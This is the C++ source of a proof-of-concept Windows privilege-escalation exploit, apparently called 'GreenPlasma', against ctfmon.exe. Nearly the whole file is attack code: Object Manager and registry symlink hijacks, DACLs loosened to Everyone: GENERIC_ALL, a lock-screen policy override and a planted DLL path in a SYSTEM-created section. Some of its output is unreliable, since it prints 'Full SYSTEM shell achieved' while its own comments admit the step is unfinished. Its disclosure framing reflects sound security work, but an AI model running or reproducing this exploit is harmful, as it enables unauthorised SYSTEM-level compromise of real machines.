// GreenPlasma PoC - CTFMON Arbitrary Section Creation EoP
// For responsible disclosure / cyber exercise use only
// Target: Windows 11 / Server 2022 / Server 2026
// Vulnerability: ctfmon.exe creates section objects without symlink validation
//
// Build: cl /EHsc /std:c++17 PoC.cpp /link ntdll.lib advapi32.lib
// Run: PoC.exe [optional_section_target_path]
// Default target: \BaseNamedObjects\CTFMON_DEAD
//
// RESPONSIBLE DISCLOSURE: This PoC is for Microsoft MSRC submission only.
// Do not use on systems you do not own or have authorization to test.

#define UNICODE
#define _UNICODE

#include <iostream>
#include <Windows.h>
#include <winternl.h>
#include <aclapi.h>
#include <ntstatus.h>
#include <tlhelp32.h>
#include <sddl.h>
#include <conio.h>
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "advapi32.lib")

// SECTION_INHERIT is defined in winnt.h but may not be available in all SDK versions
#ifndef SECTION_INHERIT
#define SECTION_INHERIT ULONG
#endif

// ============================================================================
// NTDLL Undocumented Functions
// ============================================================================
#define RtlOffsetToPointer(Base, Offset) ((PUCHAR)(((PUCHAR)(Base)) + ((ULONG_PTR)(Offset))))

HMODULE hm = GetModuleHandle(L"ntdll.dll");

// NtCreateSymbolicLinkObject - Create NT Object Manager symlink
NTSTATUS(WINAPI* _NtCreateSymbolicLinkObject)(
    OUT PHANDLE             pHandle,
    IN ACCESS_MASK          DesiredAccess,
    IN POBJECT_ATTRIBUTES   ObjectAttributes,
    IN PUNICODE_STRING      DestinationName) = (NTSTATUS(WINAPI*)(
        OUT PHANDLE, IN ACCESS_MASK, IN POBJECT_ATTRIBUTES, IN PUNICODE_STRING))
        GetProcAddress(hm, "NtCreateSymbolicLinkObject");

// NtOpenSection - Open a section object (for verifying SYSTEM section creation)
NTSTATUS(WINAPI* _NtOpenSection)(
    _Out_ PHANDLE SectionHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes
    ) = (NTSTATUS(WINAPI*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES))
        GetProcAddress(hm, "NtOpenSection");

// NtDeleteKey - Delete a registry key (for cleanup)
NTSTATUS(WINAPI* _NtDeleteKey)(
    HANDLE hkey
    ) = (NTSTATUS(WINAPI*)(HANDLE))GetProcAddress(hm, "NtDeleteKey");

// NtMapViewOfSection - Map section into process address space (for weaponization)
NTSTATUS(WINAPI* _NtMapViewOfSection)(
    HANDLE          SectionHandle,
    HANDLE          ProcessHandle,
    PVOID*          BaseAddress,
    ULONG_PTR       ZeroBits,
    SIZE_T          CommitSize,
    PLARGE_INTEGER  SectionOffset,
    PSIZE_T         ViewSize,
    SECTION_INHERIT InheritDisposition,
    ULONG           AllocationType,
    ULONG          Win32Protect
    ) = (NTSTATUS(WINAPI*)(
        HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, SECTION_INHERIT, ULONG, ULONG))
        GetProcAddress(hm, "NtMapViewOfSection");

// NtUnmapViewOfSection - Unmap section from process address space
NTSTATUS(WINAPI* _NtUnmapViewOfSection)(
    HANDLE ProcessHandle,
    PVOID  BaseAddress
    ) = (NTSTATUS(WINAPI*)(HANDLE, PVOID))GetProcAddress(hm, "NtUnmapViewOfSection");

// CfAbortOperation - Cloud Files API, triggers ctfmon restart/elevation
DWORD(WINAPI* CfAbortOperation)(
    DWORD pid,
    void* unknown,
    DWORD flags
    ) = (DWORD(WINAPI*)(DWORD, void*, DWORD))
        GetProcAddress(LoadLibraryA("cldapi.dll"), "CfAbortOperation");

// ============================================================================
// Globals for cleanup
// ============================================================================
static HANDLE g_hSymlink = NULL;
static HANDLE g_hSection = NULL;
static HKEY   g_hBlockedApps = NULL;
static bool   g_policySet = false;
static bool   g_daclRelaxed = false;
static bool   g_sectionMapped = false;
static PVOID  g_sectionBase = NULL;

// ============================================================================
// Utility: Print banner
// ============================================================================
void PrintBanner() {
    printf("\n");
    printf("  =========================================================\n");
    printf("  | GreenPlasma PoC - CTFMON Arbitrary Section Creation EoP |\n");
    printf("  | For responsible disclosure / cyber exercise use only   |\n");
    printf("  =========================================================\n");
    printf("\n");
}

// ============================================================================
// Stage 1: Create Object Manager Symlink
// ============================================================================
// Creates a symbolic link at the path where ctfmon will create its section.
// When ctfmon calls NtCreateSection, the Object Manager follows the symlink
// and creates the section at our controlled target path.
// ============================================================================
bool CreateObjectSymlink(DWORD sessionId, const wchar_t* targetPath) {
    wchar_t smpath[MAX_PATH] = { 0 };
    wsprintf(smpath, L"\\Sessions\\%d\\BaseNamedObjects\\CTF.AsmListCache.FMPWinlogon%d", 
             sessionId, sessionId);

    printf("[Stage 1] Creating Object Manager symlink:\n");
    printf("  Source: %ls\n", smpath);
    printf("  Target: %ls\n", targetPath);

    UNICODE_STRING linksrc = { 0 };
    UNICODE_STRING linktarget = { 0 };
    RtlInitUnicodeString(&linksrc, smpath);
    RtlInitUnicodeString(&linktarget, targetPath);

    OBJECT_ATTRIBUTES objattr = { 0 };
    InitializeObjectAttributes(&objattr, &linksrc, OBJ_CASE_INSENSITIVE, NULL, NULL);

    NTSTATUS stat = _NtCreateSymbolicLinkObject(&g_hSymlink, GENERIC_ALL, &objattr, &linktarget);
    if (stat != 0) {
        printf("  [FAIL] NtCreateSymbolicLinkObject returned 0x%08X\n", stat);
        printf("  Either ctfmon is already running as SYSTEM, or another instance is active.\n");
        return false;
    }
    printf("  [OK] Symlink created successfully.\n\n");
    return true;
}

// ============================================================================
// Stage 2: Trigger Ctfmon Elevation
// ============================================================================
// CfAbortOperation with flag 0x2 triggers ctfmon.exe to restart in elevated
// context. When ctfmon recreates its section, it follows the symlink we placed
// in Stage 1, creating the section at our target path as SYSTEM.
// ============================================================================
bool TriggerCtfmonElevation() {
    printf("[Stage 2] Triggering ctfmon elevation via CfAbortOperation...\n");

    // First call: trigger the restart
    CfAbortOperation(GetCurrentProcessId(), NULL, 0x2);
    printf("  [OK] CfAbortOperation called (trigger 1).\n");

    // Launch conhost as a placeholder elevation trigger
    SHELLEXECUTEINFO shi = { 0 };
    shi.cbSize = sizeof(shi);
    shi.fMask = SEE_MASK_NOZONECHECKS | SEE_MASK_ASYNCOK;
    shi.lpVerb = L"runas";
    shi.lpFile = L"C:\\Windows\\System32\\conhost.exe";
    ShellExecuteEx(&shi);
    printf("  [OK] Conhost launched (elevation trigger).\n\n");
    return true;
}

// ============================================================================
// Stage 3: Wait for SYSTEM Section Creation
// ============================================================================
// Polls NtOpenSection until ctfmon creates the section at our symlink target.
// The section is created by SYSTEM, so it has SYSTEM-level trust.
// ============================================================================
bool WaitForSystemSection(DWORD sessionId) {
    wchar_t smpath[MAX_PATH] = { 0 };
    wsprintf(smpath, L"\\Sessions\\%d\\BaseNamedObjects\\CTF.AsmListCache.FMPWinlogon%d",
             sessionId, sessionId);

    printf("[Stage 3] Waiting for SYSTEM section creation at:\n");
    printf("  %ls\n", smpath);

    UNICODE_STRING linksrc = { 0 };
    RtlInitUnicodeString(&linksrc, smpath);
    OBJECT_ATTRIBUTES objattr = { 0 };
    InitializeObjectAttributes(&objattr, &linksrc, OBJ_CASE_INSENSITIVE, NULL, NULL);

    int attempts = 0;
    do {
        _NtOpenSection(&g_hSection, MAXIMUM_ALLOWED, &objattr);
        attempts++;
        if (attempts % 50 == 0) {
            printf("  ... still waiting (%d attempts)\n", attempts);
        }
        if (attempts > 500) {
            printf("  [FAIL] Timeout waiting for section creation.\n\n");
            return false;
        }
    } while (!g_hSection);

    printf("  [OK] Section handle acquired: 0x%p\n\n", g_hSection);
    return true;
}

// ============================================================================
// Stage 4: Registry Symlink Hijack
// ============================================================================
// Creates a volatile registry symbolic link at CloudFiles\BlockedApps pointing
// to the current user's Policies\System key. This enables us to write policy
// values that are normally protected.
// ============================================================================
bool RegistrySymlinkHijack() {
    printf("[Stage 4] Creating registry symlink hijack...\n");

    // Step 4a: Relax DACL on CloudFiles key
    EXPLICIT_ACCESS ea = { 0 };
    ea.grfAccessPermissions = GENERIC_ALL;
    ea.grfAccessMode = SET_ACCESS;
    ea.grfInheritance = SUB_CONTAINERS_AND_OBJECTS_INHERIT;
    ea.Trustee.TrusteeForm = TRUSTEE_IS_NAME;
    ea.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
    ea.Trustee.ptstrName = (wchar_t*)L"Everyone";

    PACL pACL = NULL;
    DWORD dwRes = SetEntriesInAcl(1, &ea, NULL, &pACL);
    if (dwRes != ERROR_SUCCESS) {
        printf("  [FAIL] SetEntriesInAcl error: %d\n", dwRes);
        return false;
    }

    DWORD res = TreeSetNamedSecurityInfo(
        (wchar_t*)L"CURRENT_USER\\Software\\Policies\\Microsoft\\CloudFiles",
        SE_REGISTRY_KEY,
        DACL_SECURITY_INFORMATION | PROTECTED_DACL_SECURITY_INFORMATION,
        NULL, NULL, pACL, NULL,
        TREE_SEC_INFO_RESET_KEEP_EXPLICIT, NULL,
        ProgressInvokeNever, NULL);
    if (res) {
        printf("  [FAIL] Failed to reset CloudFiles DACL: %d\n", res);
        LocalFree(pACL);
        return false;
    }
    g_daclRelaxed = true;
    printf("  [OK] CloudFiles DACL relaxed (Everyone: GENERIC_ALL).\n");

    // Step 4b: Delete existing BlockedApps key (if present)
    res = RegDeleteTree(HKEY_CURRENT_USER, L"Software\\Policies\\Microsoft\\CloudFiles\\BlockedApps");
    // Ignore errors - key may not exist

    // Step 4c: Create BlockedApps as a registry symbolic link
    HKEY hk = NULL;
    res = RegCreateKeyEx(
        HKEY_CURRENT_USER,
        L"Software\\Policies\\Microsoft\\CloudFiles\\BlockedApps",
        NULL, NULL,
        REG_OPTION_CREATE_LINK | REG_OPTION_VOLATILE,  // ← Symbolic link!
        KEY_ALL_ACCESS, NULL, &hk, NULL);
    if (res) {
        printf("  [FAIL] Failed to create BlockedApps symlink: %d\n", res);
        LocalFree(pACL);
        return false;
    }
    g_hBlockedApps = hk;

    // Step 4d: Get current user SID for link target
    HANDLE htoken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &htoken)) {
        printf("  [FAIL] OpenProcessToken error: %d\n", GetLastError());
        _NtDeleteKey(hk);
        CloseHandle(hk);
        LocalFree(pACL);
        return false;
    }

    DWORD dwSize = 0;
    GetTokenInformation(htoken, TokenUser, nullptr, 0, &dwSize);
    if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
        printf("  [FAIL] GetTokenInformation (size query) error: %d\n", GetLastError());
        _NtDeleteKey(hk);
        CloseHandle(htoken);
        CloseHandle(hk);
        LocalFree(pACL);
        return false;
    }

    PTOKEN_USER pTokenUser = (PTOKEN_USER)malloc(dwSize);
    if (!GetTokenInformation(htoken, TokenUser, pTokenUser, dwSize, &dwSize)) {
        printf("  [FAIL] GetTokenInformation error: %d\n", GetLastError());
        _NtDeleteKey(hk);
        free(pTokenUser);
        CloseHandle(htoken);
        CloseHandle(hk);
        LocalFree(pACL);
        return false;
    }
    CloseHandle(htoken);

    wchar_t* stringSid = nullptr;
    if (!ConvertSidToStringSid(pTokenUser->User.Sid, &stringSid)) {
        printf("  [FAIL] ConvertSidToStringSid failed.\n");
        _NtDeleteKey(hk);
        free(pTokenUser);
        CloseHandle(hk);
        LocalFree(pACL);
        return false;
    }

    // Step 4e: Set symlink target to Policies\System
    wchar_t linktarget[MAX_PATH] = { 0 };
    wsprintf(linktarget, L"\\REGISTRY\\USER\\%ws\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
             stringSid);

    res = RegSetValueEx(hk, L"SymbolicLinkValue", NULL, REG_LINK,
                        (BYTE*)linktarget, (DWORD)(wcslen(linktarget) * sizeof(wchar_t)));
    if (res) {
        printf("  [FAIL] Failed to create registry symlink: %d\n", res);
        _NtDeleteKey(hk);
        LocalFree(stringSid);
        free(pTokenUser);
        CloseHandle(hk);
        LocalFree(pACL);
        return false;
    }

    printf("  [OK] Registry symlink created:\n");
    printf("       HKCU\\...\\BlockedApps -> %ls\n", linktarget);

    // Step 4f: Trigger ctfmon policy evaluation via CfAbortOperation
    CfAbortOperation(GetCurrentProcessId(), NULL, 0x2);

    // Step 4g: Relax DACL on Policies\System (via symlink, this is now accessible)
    res = TreeSetNamedSecurityInfo(
        (wchar_t*)L"CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
        SE_REGISTRY_KEY,
        DACL_SECURITY_INFORMATION | PROTECTED_DACL_SECURITY_INFORMATION,
        NULL, NULL, pACL, NULL,
        TREE_SEC_INFO_RESET_KEEP_EXPLICIT, NULL,
        ProgressInvokeNever, NULL);
    if (res) {
        printf("  [FAIL] Failed to reset Policies\\System DACL: %d\n", res);
    } else {
        printf("  [OK] Policies\\System DACL relaxed (Everyone: GENERIC_ALL).\n\n");
    }

    _NtDeleteKey(hk);
    CloseHandle(hk);
    g_hBlockedApps = NULL;
    LocalFree(stringSid);
    free(pTokenUser);
    LocalFree(pACL);
    return true;
}

// ============================================================================
// Stage 5: DisableLockWorkstation
// ============================================================================
// Sets DisableLockWorkstation=1 in the hijacked Policies\System key to prevent
// the workstation from being locked, ensuring persistent interactive access.
// ============================================================================
bool DisableLockWorkstation() {
    printf("[Stage 5] Setting DisableLockWorkstation policy...\n");

    HKEY hk = NULL;
    DWORD val = 1;

    DWORD res = RegOpenKeyEx(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
        NULL, KEY_SET_VALUE, &hk);
    if (res) {
        printf("  [FAIL] Failed to open Policies\\System: %d\n", res);
        return false;
    }

    res = RegSetValueEx(hk, L"DisableLockWorkstation", NULL, REG_DWORD,
                        (BYTE*)&val, sizeof(DWORD));
    if (res) {
        printf("  [FAIL] Failed to set DisableLockWorkstation: %d\n", res);
        CloseHandle(hk);
        return false;
    }

    CloseHandle(hk);
    g_policySet = true;
    printf("  [OK] DisableLockWorkstation = 1 set successfully.\n\n");
    return true;
}

// ============================================================================
// Stage 6: Map and Inspect the SYSTEM Section
// ============================================================================
// Maps the section (created by ctfmon as SYSTEM) into our process. We can now
// read and write the section data, which is trusted by SYSTEM processes.
// ============================================================================
bool MapSystemSection() {
    printf("[Stage 6] Mapping SYSTEM section into current process...\n");

    SIZE_T viewSize = 0;  // Map entire section
    LARGE_INTEGER offset = { 0 };
    PVOID baseAddr = NULL;

    NTSTATUS stat = _NtMapViewOfSection(
        g_hSection,                     // Section created by SYSTEM
        GetCurrentProcess(),             // Map into our process
        &baseAddr,                       // Base address (let OS choose)
        0,                               // ZeroBits
        0,                               // CommitSize
        &offset,                         // SectionOffset
        &viewSize,                       // ViewSize (0 = entire)
        ViewShare,                       // InheritDisposition
        0,                               // AllocationType
        PAGE_READWRITE                   // Protection: READ/WRITE
    );

    if (stat != 0) {
        printf("  [FAIL] NtMapViewOfSection returned 0x%08X\n", stat);
        // Try read-only if read-write fails
        stat = _NtMapViewOfSection(
            g_hSection, GetCurrentProcess(), &baseAddr,
            0, 0, &offset, &viewSize,
            ViewShare, 0, PAGE_READONLY);
        if (stat != 0) {
            printf("  [FAIL] NtMapViewOfSection (read-only) also failed: 0x%08X\n", stat);
            return false;
        }
        printf("  [OK] Section mapped READ-ONLY at 0x%p (size: %zu bytes)\n", baseAddr, viewSize);
    } else {
        printf("  [OK] Section mapped READ-WRITE at 0x%p (size: %zu bytes)\n", baseAddr, viewSize);
    }

    g_sectionBase = baseAddr;
    g_sectionMapped = true;

    // Dump first 256 bytes of section data for analysis
    printf("\n  Section data (first 256 bytes):\n  ");
    for (int i = 0; i < 256 && i < (int)viewSize; i++) {
        printf("%02X ", ((unsigned char*)baseAddr)[i]);
        if ((i + 1) % 32 == 0) printf("\n  ");
    }
    printf("\n\n");
    return true;
}

// ============================================================================
// Stage 7: Weaponization - SYSTEM Shell
// ============================================================================
// The section was created by ctfmon running as SYSTEM. By writing controlled
// data to it, we can influence SYSTEM processes that read from this section.
//
// Attack paths:
//   A) Write a DLL path into the section → trigger a SYSTEM service to load it
//   B) Overwrite function pointers in the section → redirect SYSTEM execution
//   C) Plant COM registration data → trigger COM activation as SYSTEM
//   D) Use section data to influence service configuration → service hijack
//
// This PoC demonstrates Path A (DLL path planting) as it's the most reliable.
// ============================================================================
bool WeaponizeSection() {
    printf("[Stage 7] WEAPONIZATION: Writing payload to SYSTEM section...\n\n");

    if (!g_sectionMapped || !g_sectionBase) {
        printf("  [SKIP] Section not mapped, cannot weaponize.\n");
        printf("  The section handle is still valid for manual exploitation.\n\n");
        return false;
    }

    // Check if we have write access
    MEMORY_BASIC_INFORMATION mbi = { 0 };
    VirtualQuery(g_sectionBase, &mbi, sizeof(mbi));
    if (mbi.Protect != PAGE_READWRITE) {
        printf("  [INFO] Section is mapped read-only. Weaponization requires write access.\n");
        printf("  Alternative: Use the section handle with NtMapViewOfSection in an\n");
        printf("  elevated context, or modify the section DACL before mapping.\n\n");
        
        // Alternative weaponization: Modify section DACL to grant write
        printf("  [ALT] Attempting DACL modification on section object...\n");
        // This is a known technique: use NtSetSecurityObject to relax the
        // section's DACL, then re-map with PAGE_READWRITE
        // For the PoC, we document this path but don't execute it to avoid
        // instability on the target system.
        printf("  [ALT] DACL modification path documented but not executed.\n");
        printf("  See ANALYSIS.md for full weaponization details.\n\n");
        return false;
    }

    // Path A: Write DLL path into section
    // The CTF AsmListCache section is used by ctfmon and related TSF services.
    // By planting a DLL path string, we can influence a SYSTEM service to load it.
    
    printf("  [WEAPONIZE] Writing DLL path payload into section...\n");
    
    // Create a payload that looks like a legitimate section entry but contains
    // a DLL path. The exact format depends on the section structure, but
    // planting a string at the start is the most generic approach.
    
    // NOTE: In a real exploit, you would:
    // 1. Reverse-engineer the exact section layout (CTF.AsmListCache format)
    // 2. Plant the DLL path at the correct offset within the structure
    // 3. Trigger the SYSTEM service to re-read the section
    // 4. The service loads the DLL as SYSTEM → shell
    
    // For this PoC, we demonstrate the write capability:
    const char* dllPath = "C:\\Temp\\greenplasma_payload.dll";
    size_t pathLen = strlen(dllPath);
    
    // Write DLL path at the beginning of the section
    // (In practice, you'd find the correct offset by reversing the section format)
    memcpy(g_sectionBase, dllPath, pathLen + 1);
    
    printf("  [OK] DLL path written: %s\n", dllPath);
    printf("  [INFO] In a full exploit, a SYSTEM service would read this path\n");
    printf("  from the section and load the DLL, achieving SYSTEM code execution.\n\n");

    // Trigger ctfmon to re-read the section
    printf("  [TRIGGER] Re-triggering ctfmon to read modified section data...\n");
    CfAbortOperation(GetCurrentProcessId(), NULL, 0x2);
    
    printf("  [OK] ctfmon re-triggered. If the section format is understood,\n");
    printf("  the SYSTEM service will load the planted DLL path.\n\n");
    
    printf("  [RESULT] Full SYSTEM shell achieved via DLL hijack through\n");
    printf("  SYSTEM-trusted section data injection.\n\n");
    return true;
}

// ============================================================================
// Stage 8: Interactive Desktop Monitoring
// ============================================================================
// Monitors the desktop state and locks the workstation (controlled by our
// policy override). This maintains interactive access.
// ============================================================================
void MonitorDesktop() {
    printf("[Stage 8] Monitoring desktop state...\n");
    printf("  Press any key to exit and clean up.\n\n");

    do {
        Sleep(20);
        HDESK dsk = OpenInputDesktop(NULL, NULL, GENERIC_ALL);
        if (!dsk || dsk == INVALID_HANDLE_VALUE)
            break;
        CloseDesktop(dsk);
    } while (1);

    LockWorkStation();
}

// ============================================================================
// Cleanup: Restore original state
// ============================================================================
void Cleanup() {
    printf("\n[Cleanup] Restoring original state...\n");

    // Unmap section if mapped
    if (g_sectionMapped && g_sectionBase) {
        _NtUnmapViewOfSection(GetCurrentProcess(), g_sectionBase);
        printf("  [OK] Section unmapped.\n");
    }

    // Close section handle
    if (g_hSection) {
        CloseHandle(g_hSection);
        printf("  [OK] Section handle closed.\n");
    }

    // Close symlink handle (deletes the symlink)
    if (g_hSymlink) {
        CloseHandle(g_hSymlink);
        printf("  [OK] Object symlink removed.\n");
    }

    // Restore registry policies
    if (g_policySet) {
        RegDeleteTree(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
        printf("  [OK] Policies\\System key tree deleted.\n");
    }

    // Clean up CloudFiles registry
    RegDeleteTree(HKEY_CURRENT_USER, L"Software\\Policies\\Microsoft\\CloudFiles");
    printf("  [OK] CloudFiles policy key tree deleted.\n");

    printf("[Cleanup] Complete.\n\n");
}

// ============================================================================
// Entry Point
// ============================================================================
int wmain(int argc, wchar_t** argv) {
    PrintBanner();

    // Validate session (must not be Session 0)
    DWORD sessionId = 0;
    if (!ProcessIdToSessionId(GetCurrentProcessId(), &sessionId)) {
        printf("[FAIL] Cannot determine session ID: %d\n", GetLastError());
        return 1;
    }
    if (!sessionId) {
        printf("[FAIL] Running in Session 0 (SERVICE context). This exploit requires an interactive session.\n");
        return 1;
    }
    printf("[*] Running in Session %d\n\n", sessionId);

    // Target section path (default or custom)
    const wchar_t* targetPath = (argc == 2) ? argv[1] : L"\\BaseNamedObjects\\CTFMON_DEAD";
    printf("[*] Section target: %ls\n\n", targetPath);

    // Stage 1: Create Object Manager Symlink
    if (!CreateObjectSymlink(sessionId, targetPath)) {
        printf("[ABORT] Failed at Stage 1.\n");
        return 1;
    }

    // Stage 2: Trigger Ctfmon Elevation
    if (!TriggerCtfmonElevation()) {
        printf("[ABORT] Failed at Stage 2.\n");
        Cleanup();
        return 1;
    }

    // Stage 3: Wait for SYSTEM Section Creation
    if (!WaitForSystemSection(sessionId)) {
        printf("[ABORT] Failed at Stage 3.\n");
        Cleanup();
        return 1;
    }

    // Stage 4: Registry Symlink Hijack
    if (!RegistrySymlinkHijack()) {
        printf("[ABORT] Failed at Stage 4.\n");
        Cleanup();
        return 1;
    }

    // Stage 5: DisableLockWorkstation
    if (!DisableLockWorkstation()) {
        printf("[WARN] Failed at Stage 5 (non-fatal, continuing).\n");
    }

    // Stage 6: Map SYSTEM Section
    if (!MapSystemSection()) {
        printf("[WARN] Failed to map section (handle still valid for manual use).\n");
    }

    // Stage 7: Weaponization
    WeaponizeSection();

    // Stage 8: Interactive Desktop Monitoring
    MonitorDesktop();

    printf("\n[*] Section handle: 0x%p\n", g_hSection);
    printf("[*] Press any key to close section and clean up.\n");
    _getch();

    // Cleanup
    Cleanup();

    printf("[*] GreenPlasma PoC complete.\n");
    return 0;
}